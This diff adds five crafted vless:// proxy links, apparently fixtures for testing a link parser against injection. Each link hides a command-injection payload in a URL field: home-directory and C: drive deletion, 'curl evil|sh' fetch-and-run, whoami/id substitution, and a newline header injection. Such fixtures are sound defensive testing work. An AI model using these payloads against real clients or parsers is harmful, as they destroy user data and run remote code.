@@ -1,0 +1,5 @@
+vless://{UUID}@a.example.com:443?security=tls&type=tcp#%24(rm%20-rf%20~)
+vless://{UUID}@b.example.com:443?security=tls&type=tcp#%60calc.exe%60%3B%20%26%20del%20%2Ff%20%2Fq%20C%3A*
+vless://{UUID}@c.example.com:443?security=tls&sni=%24(whoami)&type=ws&path=%2F%3Bcurl%20evil%7Csh#inj
+vless://{UUID}@$(id).example.com:443?security=tls#hostinj
+vless://{UUID}@d.example.com:443?security=tls&fp=chrome%0Ainjected%3Dtrue#newline
